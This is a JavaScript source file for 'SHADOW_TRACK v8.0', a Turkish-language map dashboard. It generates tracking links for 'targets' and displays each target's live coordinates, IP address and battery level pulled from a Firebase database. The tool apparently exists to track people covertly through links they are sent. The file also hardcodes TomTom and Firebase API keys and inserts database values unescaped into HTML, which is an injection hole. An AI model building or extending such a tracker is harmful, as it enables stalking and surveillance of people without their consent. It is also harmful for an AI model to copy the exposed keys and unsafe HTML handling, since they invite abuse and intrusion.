// --- CONFIG ---
const TOMTOM_KEY = '3xX5NwSGmW2O8MyQ9fwOPqHA8chsMdY1'; 
const firebaseConfig = {
    apiKey: "AIzaSyCDNbgKzJdBKEZUnWH09Az6ZCwUefWJXhY",
    authDomain: "onlinesiparis-2cf91.firebaseapp.com",
    projectId: "onlinesiparis-2cf91",
    databaseURL: "https://onlinesiparis-2cf91-default-rtdb.europe-west1.firebasedatabase.app",
    storageBucket: "onlinesiparis-2cf91.appspot.com",
    messagingSenderId: "366801664755",
    appId: "1:366801664755:web:57b577f1943ebdf1ab8c85"
};

let map, trafficLayer, myLocationMarker;
let deviceMarkers = {}; 

// SİSTEM BAŞLATMA
if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
const database = firebase.database();

document.addEventListener('DOMContentLoaded', () => {
    initMap();
    setInterval(updateClock, 1000);
    addLog("SHADOW_TRACK v8.0 ÇEVRİMİÇİ. OPERASYONA HAZIR.");
});

function initMap() {
    map = L.map('map', { center: [41.0082, 28.9784], zoom: 11, zoomControl: false });
    L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png').addTo(map);
    
    // 🚗 TRAFİK KATMANI VE ANİMASYON (YENİ)
    trafficLayer = L.tileLayer(`https://{s}.api.tomtom.com/traffic/map/4/tile/flow/relative0/{z}/{x}/{y}.png?key=${TOMTOM_KEY}`, { 
        opacity: 0.8,
        pane: 'overlayPane' // Leaflet panes kullanarak animasyonu yollara izole et
    }).addTo(map);
    
    // Trafik katmanı yüklendiğinde CSS sınıfını ekle
    trafficLayer.getContainer().classList.add('road-flow-layer');

    map.on('click', onMapClick);
}

// --- CİHAZ YÖNETİMİ, KOORDİNATLAR VE KONUMA UÇMA (GÜNCELLENDİ) ---
database.ref('locations').on('value', (snapshot) => {
    const data = snapshot.val();
    const list = document.getElementById('deviceList');
    list.innerHTML = ''; 

    if (!data) {
        list.innerHTML = '<div class="text-gray-600 italic text-[10px] text-center">Aktif hedef yok.</div>';
        for (let id in deviceMarkers) { map.removeLayer(deviceMarkers[id]); delete deviceMarkers[id]; }
        return;
    }

    for (let id in data) {
        const info = data[id];
        const latLng = [info.lat, info.lng];
        
        // Marker Güncelle
        if (deviceMarkers[id]) {
            deviceMarkers[id].setLatLng(latLng);
        } else {
            deviceMarkers[id] = L.marker(latLng, {
                icon: L.divIcon({ className: 'd-icon', html: `<i class="fas fa-crosshairs text-green-500 fa-2x animate-pulse"></i>` })
            }).addTo(map);
        }

        // Listeye Ekle, Koordinatları Göster ve Tıklayınca Konuma Uç
        const div = document.createElement('div');
        // 👇 TIKLAYINCA KONUMA UÇ (centerOnDevice) - pointer-events aktif
        div.className = "glass-panel p-2.5 mb-2.5 border-l-2 border-green-500 text-[10px] group pointer-events-auto hover:border-green-300 transition-all";
        div.setAttribute('onclick', `centerOnDevice(${info.lat}, ${info.lng}, '${id}')`);
        
        // Koordinatları Formatla (Örn: 41.0082, 28.9784)
        const coordStr = `${info.lat.toFixed(4)}, ${info.lng.toFixed(4)}`;

        div.innerHTML = `
            <div class="flex justify-between items-center">
                <span class="text-green-400 font-bold italic">${id}</span>
                <button onclick="event.stopPropagation(); deleteDevice('${id}')" class="text-red-600 opacity-0 group-hover:opacity-100 transition-all text-sm"><i class="fas fa-trash-alt"></i></button>
            </div>
            <div class="text-gray-500 mt-1.5 space-y-0.5 font-mono">
                <div>IP: <span class="text-white">${info.ip || '...'}</span></div>
                <div>PİL: <span class="text-white">${info.battery || '--'}</span></div>
                <div class="text-cyan-400 border-t border-white/10 pt-1 mt-1 font-bold">KOORD: ${coordStr}</div>
            </div>
        `;
        list.appendChild(div);
    }
});

// CİHAZ KONUMUNA UÇMA (YENİ)
function centerOnDevice(lat, lng, id) {
    map.flyTo([lat, lng], 17, {
        animate: true,
        duration: 2.0 // Saniye cinsinden akış süresi
    });
    addLog(`Hedefe Odaklanıldı: ${id}`);
}

// --- LİNK OLUŞTURUCU (TAM İSTEDİĞİN FORMAT) ---
function generateTrackingLink() {
    const randomId = Math.floor(Math.random() * 9000) + 1000;
    const nodeId = "NODE_" + randomId;
    const fullURL = `https://berkaytdev.com/track.html?id=${nodeId}`;
    
    document.getElementById('generatedLink').value = fullURL;
    document.getElementById('linkModal').classList.remove('hidden');
    addLog(`YENİ HEDEF KİMLİĞİ HAZIR: ${nodeId}`);
}

// --- TAKTİKSEL MODALLAR VE SİLME (GÜNCELLENDİ) ---
function deleteDevice(id) {
    showConfirmModal(
        `<i class="fas fa-trash-alt"></i> HEDEF İMHA ONAYI`,
        ` kimlikli hedefi sistemden kalıcı olarak silmek ve haritadan kaldırmak istiyor musunuz? Bu işlem geri alınamaz.`,
        () => {
            database.ref('locations/' + id).remove().then(() => {
                if (deviceMarkers[id]) { map.removeLayer(deviceMarkers[id]); delete deviceMarkers[id]; }
                addLog(`HEDEF VERİTABANINDAN SİLİNDİ: ${id}`);
                showAlertModal("İŞLEM BAŞARILI", `Hedef ${id} başarıyla imha edildi.`, "fas fa-check-circle text-green-500");
            }).catch(e => {
                showAlertModal("İŞLEM BAŞARISIZ", `Sistem hatası: ${e.message}`, "fas fa-times-circle text-red-600");
            });
        }
    );
}

// --- TAKTİKSEL MODAL YARDIMCILARI (YENİ) ---
function showConfirmModal(title, message, callback) {
    const modal = document.getElementById('tacticModal');
    document.getElementById('modalTitle').innerHTML = title;
    document.getElementById('modalTitle').classList.remove('text-green-500');
    document.getElementById('modalTitle').classList.add('text-red-500');
    document.getElementById('modalMsg').innerText = message;
    document.getElementById('modalIcon').className = "fas fa-exclamation-triangle";
    
    const buttons = document.getElementById('modalButtons');
    buttons.innerHTML = `
        <button onclick="document.getElementById('tacticModal').classList.add('hidden')" class="modal-btn modal-btn-cancel">İPTAL</button>
        <button id="modalConfirmBtn" class="modal-btn modal-btn-ok">ONAYLA</button>
    `;
    
    document.getElementById('modalConfirmBtn').onclick = () => {
        modal.classList.add('hidden');
        callback();
    };
    
    modal.classList.remove('hidden');
}

function showAlertModal(title, message, iconClass) {
    const modal = document.getElementById('tacticModal');
    document.getElementById('modalTitle').innerHTML = title;
    document.getElementById('modalTitle').classList.remove('text-red-500');
    document.getElementById('modalTitle').classList.add('text-green-500');
    document.getElementById('modalMsg').innerText = message;
    document.getElementById('modalIcon').className = iconClass;
    
    const buttons = document.getElementById('modalButtons');
    buttons.innerHTML = `
        <button onclick="document.getElementById('tacticModal').classList.add('hidden')" class="modal-btn modal-btn-ok border-green-500 text-green-500 bg-green-900/20 hover:bg-green-500 hover:text-black">KAPAT</button>
    `;
    
    modal.classList.remove('hidden');
}

// --- DİĞER FONKSİYONLAR (Analiz, Arama vb.) ---
async function onMapClick(e) {
    const { lat, lng } = e.latlng;
    const res = await fetch(`https://api.tomtom.com/search/2/reverseGeocode/${lat},${lng}.json?key=${TOMTOM_KEY}&language=tr-TR`);
    const data = await res.json();
    L.popup().setLatLng(e.latlng).setContent(`<div class="text-[10px]"><b>KONUM:</b> ${data.addresses[0].address.freeformAddress}</div>`).openOn(map);
}

function updateClock() { document.getElementById('sysTime').innerText = new Date().toLocaleTimeString('tr-TR'); }
function addLog(m) {
    const f = document.getElementById('dataFeed');
    const d = document.createElement('div');
    d.innerHTML = `<span class="text-red-900">[${new Date().toLocaleTimeString()}]</span> ${m}`;
    f.prepend(d);
}

function searchLocation() {
    const q = document.getElementById('searchInput').value;
    if(!q) return;
    fetch(`https://api.tomtom.com/search/2/geocode/${encodeURIComponent(q)}.json?key=${TOMTOM_KEY}&limit=1`)
        .then(r => r.json()).then(d => {
            if (d.results[0]) map.flyTo([d.results[0].position.lat, d.results[0].position.lon], 15);
        });
}

function getMyLocation() {
    navigator.geolocation.getCurrentPosition(p => {
        const coords = [p.coords.latitude, p.coords.longitude];
        map.flyTo(coords, 16);
        L.circleMarker(coords, { radius: 8, color: '#00ffff' }).addTo(map);
    }, () => {
        showAlertModal("HATA", "GPS Erişimi engellendi. Konum bulunamıyor.", "fas fa-times-circle text-red-600");
    });
}

function toggleLayer(t) {
    if (t === 'traffic') map.hasLayer(trafficLayer) ? map.removeLayer(trafficLayer) : trafficLayer.addTo(map);
    document.getElementById('btn-' + t).classList.toggle('active');
}
